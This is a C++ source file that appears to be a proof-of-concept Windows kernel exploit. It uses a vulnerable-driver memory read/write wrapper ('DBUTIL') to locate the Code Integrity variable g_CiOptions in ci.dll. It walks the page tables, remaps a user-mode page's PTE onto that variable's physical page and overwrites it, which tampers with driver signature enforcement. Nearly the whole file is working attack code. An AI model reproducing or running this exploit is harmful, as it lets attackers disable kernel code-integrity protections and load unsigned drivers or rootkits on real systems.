#pragma once
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <winhttp.h>
#pragma comment(lib, "Winhttp.lib")
#include <tchar.h>
#include <Psapi.h>
#include <DbgHelp.h>
#pragma comment(lib, "Dbghelp.lib")

#include "dbutil.h"
#include "pdb.h"

#include <string>
#include <array>
#include <algorithm>

struct SymInfoOffsets {
	DWORD ProcessControlBlock = 0; // Optional, not used in driver
    DWORD ImageFileName = 0;
    DWORD ActiveProcessLinks = 0;
    DWORD DirectoryTableBase = 0;
    DWORD GciOptions = 0;
    DWORD MmPfnDatabase = 0;
    DWORD PfnPteAddress = 0;
	DWORD PsActiveProcessHead = 0; // Optional, not used in driver
	DWORD GetPteAddress = 0; // Optional, not used in driver
};

struct ComInfoPayload {
    unsigned long long NTKRNLBASE = 0;
    unsigned long long CIBASE = 0;
    // up to 15 chars each (driver prints with %.15s)
    CHAR NTKRNLBASENAME[15] = { 0 };
    CHAR CIBASENAME[15] = { 0 };
};

DWORD64 GetModuleBaseAddress(_In_ std::string name) {
	/* Gets the base address (VIRTUAL ADDRESS) of a module in kernel address space */
	// Defining EnumDeviceDrivers() and GetDeviceDriverBaseNameA() parameters
	LPVOID lpImageBase[1024]{};
	DWORD lpcbNeeded{};
	int drivers{};
	char lpFileName[1024]{};
	DWORD64 imageBase{};
	// Grabs an array of all of the device drivers
	BOOL success = EnumDeviceDrivers(
		lpImageBase,
		sizeof(lpImageBase),
		&lpcbNeeded
	);
	// Makes sure that we successfully grabbed the drivers
	if (!success)
	{
		printf("[-] Unable to invoke EnumDeviceDrivers()!\n");
		return 0;
	}
	// Defining number of drivers for GetDeviceDriverBaseNameA()
	drivers = lpcbNeeded / sizeof(lpImageBase[0]);
	// Parsing loaded drivers
	for (int i = 0; i < drivers; i++) {
		// Gets the name of the driver
		GetDeviceDriverBaseNameA(
			lpImageBase[i],
			lpFileName,
			sizeof(lpFileName) / sizeof(char)
		);
		// Compares the indexed driver and with our specified driver name
		if (!strcmp(name.c_str(), lpFileName)) {
			imageBase = (DWORD64)lpImageBase[i];
			break;
		}
	}
	return imageBase;
}

// =========================================================================
//                   resolve required symbols/offsets
// =========================================================================

static bool ResolveDriverSymbols(SymInfoOffsets& out) {
	// Resolve from ntoskrnl.exe
	TCHAR ntPath[MAX_PATH] = L"C:\\Windows\\System32\\ntoskrnl.exe";
	symbol_ctx* ntCtx = LoadSymbolsFromImageFile(ntPath);
	if (!ntCtx) {
		std::cerr << "[-] Failed to load symbols for ntoskrnl.exe" << std::endl;
		return false;
	}

	DWORD pcb = GetFieldOffset(ntCtx, "_EPROCESS", L"Pcb");
	DWORD img = GetFieldOffset(ntCtx, "_EPROCESS", L"ImageFileName");
	DWORD apl = GetFieldOffset(ntCtx, "_EPROCESS", L"ActiveProcessLinks");
	DWORD dtb = GetFieldOffset(ntCtx, "_KPROCESS", L"DirectoryTableBase");
	DWORD psa = GetSymbolOffset(ntCtx, "PsActiveProcessHead");
	DWORD pfn = GetSymbolOffset(ntCtx, "MmPfnDatabase");
	DWORD pte = GetFieldOffset(ntCtx, "_MMPFN", L"PteAddress");
	DWORD ptb = GetSymbolOffset(ntCtx, "MiGetPteAddress");

	out.ProcessControlBlock = pcb;
	out.DirectoryTableBase = dtb;
	out.ImageFileName = img;
	out.ActiveProcessLinks = apl;
	out.PsActiveProcessHead = psa;
	out.MmPfnDatabase = pfn;
	out.PfnPteAddress = pte;
	out.GetPteAddress = ptb;

	// Resolve from ci.dll
	TCHAR ciPath[MAX_PATH] = L"C:\\Windows\\System32\\ci.dll";
	symbol_ctx* ciCtx = LoadSymbolsFromImageFile(ciPath);
	if (!ciCtx) {
		std::cerr << "[-] Failed to load symbols for ci.dll" << std::endl;
		UnloadSymbols(ntCtx, FALSE);
		CleanupSymbolHandler(GetCurrentProcess());
		return false;
	}

	// Try common names
	DWORD64 gci = GetSymbolOffset(ciCtx, "g_CiOptions");
	out.GciOptions = static_cast<DWORD>(gci);

	// Cleanup
	UnloadSymbols(ciCtx, FALSE);
	UnloadSymbols(ntCtx, FALSE);
	CleanupSymbolHandler(GetCurrentProcess());

	return true;
}

static inline uint64_t Canonicalize(uint64_t x) {
	// sign-extend bit 47 into bits 48..63
	if (x & (1ULL << 47)) x |= 0xFFFF000000000000ULL;
	return x;
}

ULONG64 GetVAToPML4eVA(ULONG64 vaddr, ULONG64 selfRef) {
	// Extract the PML4 index from the original VA
	ULONG64 PML4i = (vaddr >> 39) & 0x1FF;

	// Build the virtual address in the self-ref PML4 region
	ULONG64 va = (selfRef << 39) | (selfRef << 30) | (selfRef << 21) | (selfRef << 12) | (PML4i << 3);
	// <<3 because each PML4 entry = 8 bytes

	return Canonicalize(va);
}

ULONG64 GetVAToPDPTeVA(ULONG64 vaddr, ULONG64 selfRef) {
	// Extract the PDPT index from the original VA
	ULONG64 PML4i = (vaddr >> 39) & 0x1FF;
	ULONG64 PDPTi = (vaddr >> 30) & 0x1FF;

	// Build the virtual address in the self-ref PDPT region
	ULONG64 va = (selfRef << 39) | (selfRef << 30) | (selfRef << 21) | (PML4i << 12) | (PDPTi << 3);
	// <<3 because each PDPT entry = 8 bytes

	return Canonicalize(va);
}

ULONG64 GetVAToPDeVA(ULONG64 vaddr, ULONG64 selfRef) {
	// Extract the PDE index from the original VA
	ULONG64 PML4i = (vaddr >> 39) & 0x1FF;
	ULONG64 PDPTi = (vaddr >> 30) & 0x1FF;
	ULONG64 PDEi = (vaddr >> 21) & 0x1FF;

	// Build the virtual address in the self-ref PDE region
	ULONG64 va = (selfRef << 39) | (selfRef << 30) | (PML4i << 21) | (PDPTi << 12) | (PDEi << 3);
	// <<3 because each PDE entry = 8 bytes

	return Canonicalize(va);
}

ULONG64 GetVAToPTeVA(ULONG64 vaddr, ULONG64 selfRef) {
	ULONG64 PML4i = (vaddr >> 39) & 0x1FF;
	ULONG64 PDPTi = (vaddr >> 30) & 0x1FF;
	ULONG64 PDEi = (vaddr >> 21) & 0x1FF;
	ULONG64 PTEi = (vaddr >> 12) & 0x1FF;

	ULONG64 va = (selfRef << 39) |
		(PML4i << 30) |
		(PDPTi << 21) |
		(PDEi << 12) |
		(PTEi << 3);
	return Canonicalize(va);
}

ULONG GetPageMappingPA(DBUTIL &dbutil,
		ULONG64 gCi_PML4e_VA,
		ULONG64 gCi_PDPTe_VA,
		ULONG64 gCi_PDEe_VA,
		ULONG64 gCi_PTEe_VA,
		ULONG64 vaddr) {
	ULONG64 gCi_e_content = 0;
	ULONG pfn = 0;
	ULONG offset = 0;
	BYTE gCi_PML4e_PS_BIT, gCi_PDPTe_PS_BIT, gCi_PDEe_PS_BIT = 0;
	// Walk the page tables to get the physical address of vaddr
	dbutil.ReadMemory(gCi_PML4e_VA, &gCi_e_content, sizeof(gCi_e_content));
	if ((gCi_e_content & 0x1) != 0x1) {
		printf("[-] vaddr PML4e not present\n");
		return 0x0;
	}

	dbutil.ReadMemory(gCi_PDPTe_VA, &gCi_e_content, sizeof(gCi_e_content));
	if ((gCi_e_content & 0x80) >> 0x7 == 0x1) { // Bit 7 is PS (Page Size) bit
		// 1GB Huge page
		printf("[*] vaddr mapped via 1GB page\n");
		pfn = (gCi_e_content >> 12) & 0xFFFFFFFFFF; // PFN Mask bits 12–51, thats a 40-bit field
		offset = vaddr & 0x3FFFFFFF; // Offset in 1GB page
		return (pfn * 0x1000) + offset;
	}

	dbutil.ReadMemory(gCi_PDEe_VA, &gCi_e_content, sizeof(gCi_e_content));
	if ((gCi_e_content & 0x80) >> 0x7 == 0x1) { // Bit 7 is PS (Page Size) bit
		// 2MB Large page
		printf("[*] vaddr mapped via 2MB page\n");
		pfn = (gCi_e_content >> 12) & 0xFFFFFFFFFF; // PFN Mask bits 12–51, thats a 40-bit field
		offset = vaddr & 0x1FFFFF; // Offset in 2MB page
		return (pfn * 0x1000) + offset;
	}

	dbutil.ReadMemory(gCi_PTEe_VA, &gCi_e_content, sizeof(gCi_e_content));
	printf("[*] vaddr mapped via 4KB page\n");
	pfn = (gCi_e_content >> 12) & 0xFFFFFFFFFF; // PFN Mask bits 12–51, thats a 40-bit field
	offset = vaddr & 0xFFF; // Offset in 4KB page
	return (pfn * 0x1000) + offset;
}

ULONG64 GetVirtualForPhysical(DBUTIL &dbutil, ULONG32 phys, ULONG64 pfnDatabaseBase) {
	//PVOID __stdcall MmGetVirtualForPhysical(PHYSICAL_ADDRESS PhysicalAddress)
	//{
	//	return (PVOID)((PhysicalAddress.LowPart & 0xFFF)
	//		+ ((__int64)(*(_QWORD*)(48 * ((unsigned __int64)PhysicalAddress.QuadPart >> 12) - 0x57FFFFFFFF8LL) << 25) >> 16));
	//}
	BYTE IsCanonicalBit = 0;
	DWORD offset = 0;
	ULONG64 vaddr = 0;
	ULONG64 pageBase = 0;
	ULONG64 entry = 0;
	offset = phys & 0xFFF;
	dbutil.ReadMemory(pfnDatabaseBase, &pfnDatabaseBase, sizeof(pfnDatabaseBase));
	entry = ((0x30 * (phys >> 12)) + pfnDatabaseBase) + 0x8; // (phys >> 0xC) will give the PFN; ... + 0x8
	dbutil.ReadMemory(entry, &pageBase, sizeof(pageBase));
	pageBase = (pageBase << 0x19) >> 0x10;
	vaddr = pageBase + offset;
	IsCanonicalBit = (vaddr >> 47) & 0x1;
	if (IsCanonicalBit) {
		printf("[*] Sign-extend bit 47 into bits 48..63\n");
		vaddr = Canonicalize(vaddr);
	}
	return vaddr;
}

// =========================================================================
//                                 main
// =========================================================================

int main() {
	// Step 1: Resolve the offsets/symbols the driver needs
	SymInfoOffsets sym{};
	if (!ResolveDriverSymbols(sym)) {
		std::cerr << "[-] Failed to resolve required symbols/offsets" << std::endl;
		return 1;
	}

	std::cout << "[+] Resolved Offsets:" << std::endl;
	std::cout << "    Pcb:                 0x" << std::hex << sym.ProcessControlBlock << std::endl;
	std::cout << "    DirectoryTableBase:  0x" << std::hex << sym.DirectoryTableBase << std::endl;
	std::cout << "    ImageFileName:       0x" << std::hex << sym.ImageFileName << std::endl;
	std::cout << "    ActiveProcessLinks:  0x" << std::hex << sym.ActiveProcessLinks << std::endl;
	std::cout << "    PsActiveProcessHead: 0x" << std::hex << sym.PsActiveProcessHead << std::endl;
	std::cout << "    g_CiOptions:         0x" << std::hex << sym.GciOptions << std::endl;
	std::cout << "    MmPfnDatabase:       0x" << std::hex << sym.MmPfnDatabase << std::endl;
	std::cout << "    PfnPteAddress:       0x" << std::hex << sym.PfnPteAddress << std::endl;
	std::cout << "    MiGetPteAddress:     0x" << std::hex << sym.GetPteAddress << std::endl;

	// Prepare ComInfo structure
	ComInfoPayload comm{};
	strncpy_s(comm.NTKRNLBASENAME, "ntoskrnl.exe", _TRUNCATE);
	strncpy_s(comm.CIBASENAME, "ci.dll", _TRUNCATE);
	comm.NTKRNLBASE = (unsigned long long)GetModuleBaseAddress("ntoskrnl.exe");
	comm.CIBASE = (unsigned long long)GetModuleBaseAddress("CI.dll");
	printf("[+] \n\tntoskrnl.exe base: 0x%llx,\n\t ci.dll base: 0x%llx\n", comm.NTKRNLBASE, comm.CIBASE);

	DBUTIL dbutil{};
	// Translate g_CiOptions virtual address to physical address
	DWORD64 dwgCiOptionsVA = comm.CIBASE + sym.GciOptions;
	printf("\n[+] g_CiOptions VA: 0x%llx\n", dwgCiOptionsVA);

	ULONG64 PteBase = 0;
	ULONG64 PdeBase = 0;
	ULONG64 PdptBase = 0;
	ULONG64 Pml4Base = 0;
	ULONG64 PteSelfRefIndex = 0;
	dbutil.ReadMemory(comm.NTKRNLBASE + sym.GetPteAddress + 0x13, &PteBase, sizeof(ULONG64));
	PteSelfRefIndex = (DWORD)((PteBase >> 39) & 0x1FF); // 0x27
	PdeBase = (PteSelfRefIndex << 39) | (PteSelfRefIndex << 30); // 0x27, 0x1E
	PdptBase = (PteSelfRefIndex << 39) | (PteSelfRefIndex << 30) | (PteSelfRefIndex << 21); // 0x27, 0x1E, 0x15
	Pml4Base = (PteSelfRefIndex << 39) | (PteSelfRefIndex << 30) | (PteSelfRefIndex << 21) | (PteSelfRefIndex << 12); // 0x27, 0x1E, 0x15, 0xC
	// Make addresses canonical
	PteBase = Canonicalize(PteBase);
	PdeBase = Canonicalize(PdeBase);
	PdptBase = Canonicalize(PdptBase);
	Pml4Base = Canonicalize(Pml4Base);
	printf("[*] Self-ref index: 0x%llx\n", PteSelfRefIndex);
	printf("[*] PML4 - Base: 0x%llx\n", Pml4Base);
	printf("[*] PDPT - Base: 0x%llx\n", PdptBase);
	printf("[*] PD   - Base: 0x%llx\n", PdeBase);
	printf("[*] PT   - Base: 0x%llx\n", PteBase);

	// gCiOptions page table entries (self-ref)
	ULONG64 gCi_PML4e_VA = GetVAToPML4eVA(dwgCiOptionsVA, PteSelfRefIndex);
	ULONG64 gCi_PDPTe_VA = GetVAToPDPTeVA(dwgCiOptionsVA, PteSelfRefIndex);
	ULONG64 gCi_PDEe_VA = GetVAToPDeVA(dwgCiOptionsVA, PteSelfRefIndex);
	ULONG64 gCi_PTEe_VA = GetVAToPTeVA(dwgCiOptionsVA, PteSelfRefIndex);
	printf("[*] g_CiOptions PML4e VA: 0x%llx\n", gCi_PML4e_VA);
	printf("[*] g_CiOptions PDPTe VA: 0x%llx\n", gCi_PDPTe_VA);
	printf("[*] g_CiOptions PDEe  VA: 0x%llx\n", gCi_PDEe_VA);
	printf("[*] g_CiOptions PTEe  VA: 0x%llx\n", gCi_PTEe_VA);

	ULONG gCi_Phys = GetPageMappingPA(dbutil, gCi_PML4e_VA, gCi_PDPTe_VA, gCi_PDEe_VA, gCi_PTEe_VA, dwgCiOptionsVA);
	printf("[*] g_CiOptions physical address: 0x%x\n", gCi_Phys);
	ULONG64 gCi_VA_For_Phys = GetVirtualForPhysical(dbutil, gCi_Phys, comm.NTKRNLBASE + sym.MmPfnDatabase);
	printf("[*] g_CiOptions VA from PA: 0x%llx\n", gCi_VA_For_Phys);

	// Own memory page table entries (self-ref)
	PVOID ptr = VirtualAlloc(
		NULL,
		4096,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	if (!ptr) {
		std::cerr << "VirtualAlloc failed: " << GetLastError() << "\n";
		return 1;
	}
	// Touch the page
	memset(ptr, 0, 4096);

	std::cout << "Page allocated and paged in at: " << ptr << "\n";

	ULONG64 ptr_PML4e_VA = GetVAToPML4eVA((ULONG64)ptr, PteSelfRefIndex);
	ULONG64 ptr_PDPTe_VA = GetVAToPDPTeVA((ULONG64)ptr, PteSelfRefIndex);
	ULONG64 ptr_PDEe_VA = GetVAToPDeVA((ULONG64)ptr, PteSelfRefIndex);
	ULONG64 ptr_PTEe_VA = GetVAToPTeVA((ULONG64)ptr, PteSelfRefIndex);
	printf("[*] ptr PML4e VA: 0x%llx\n", ptr_PML4e_VA);
	printf("[*] ptr PDPTe VA: 0x%llx\n", ptr_PDPTe_VA);
	printf("[*] ptr PDEe  VA: 0x%llx\n", ptr_PDEe_VA);
	printf("[*] ptr PTEe  VA: 0x%llx\n", ptr_PTEe_VA);

	ULONG ptr_Phys = GetPageMappingPA(dbutil, ptr_PML4e_VA, ptr_PDPTe_VA, ptr_PDEe_VA, ptr_PTEe_VA, (ULONG64)ptr);
	printf("[*] ptr physical address: 0x%x\n", ptr_Phys);
	ULONG64 ptr_VA_For_Phys = GetVirtualForPhysical(dbutil, ptr_Phys, comm.NTKRNLBASE + sym.MmPfnDatabase);
	printf("[*] ptr VA from PA: 0x%llx\n", ptr_VA_For_Phys);

	ULONG64 ptr_PTEe_VA_BAK = 0;
	ULONG64 gCi_e_content = 0;
	ULONG64 ptr_e_content = 0;
	dbutil.ReadMemory(ptr_PTEe_VA, &ptr_e_content, sizeof(ULONG64));
	dbutil.ReadMemory(gCi_PTEe_VA, &gCi_e_content, sizeof(ULONG64));
	printf("[*] gCiOptions PTE Content: 0x%llx\n", gCi_e_content);
	printf("[*] ptr        PTE Content: 0x%llx\n", ptr_e_content);
	ptr_PTEe_VA_BAK = ptr_e_content;

	// replace bits 12-51 of ptr PTE with bits 12-51 of gCiOptions PTE
	// extract PFN (bits 12-51)
	ULONG64 gCi_pfn = (gCi_e_content >> 12) & 0xFFFFFFFFFFULL;;
	// clear bits 12-51
	ptr_e_content &= ~(0xFFFFFFFFFFULL << 12);
	// insert new PFN bits
	ptr_e_content |= (gCi_pfn << 12);

	dbutil.WriteMemory(ptr_PTEe_VA, &ptr_e_content, sizeof(ULONG64));
	dbutil.ReadMemory(ptr_PTEe_VA, &ptr_e_content, sizeof(ULONG64));
	printf("[*] ptr (mod)  PTE Content: 0x%llx\n", ptr_e_content);
	ULONG64 test = 0xe;
	memcpy((PBYTE)ptr + (sym.GciOptions & 0xFFF), &test, sizeof(ULONG64));
	// print out 50 bytes of ptr + sym.GciOptions. New printf for each 8 bytes.
	// without dbutil.ReadMemory directly form ptr
	SIZE_T dumpSize = 64; // e.g. dump 64 bytes
	for (SIZE_T i = 0; i < dumpSize; i += 16) {
		ULONG64 val1 = 0, val2 = 0;

		memcpy(&val1, (PBYTE)ptr + (sym.GciOptions & 0xFFF) + i, sizeof(ULONG64));
		memcpy(&val2, (PBYTE)ptr + (sym.GciOptions & 0xFFF) + i + 8, sizeof(ULONG64));

		// Print like WinDbg: address, then two 8-byte chunks
		printf("%016llx  %016llx %016llx\n",
			(ULONG64)ptr + i,
			val1,
			val2);
	}
	dbutil.WriteMemory(ptr_PTEe_VA, &ptr_PTEe_VA_BAK, sizeof(ULONG64));
	return 0;
}
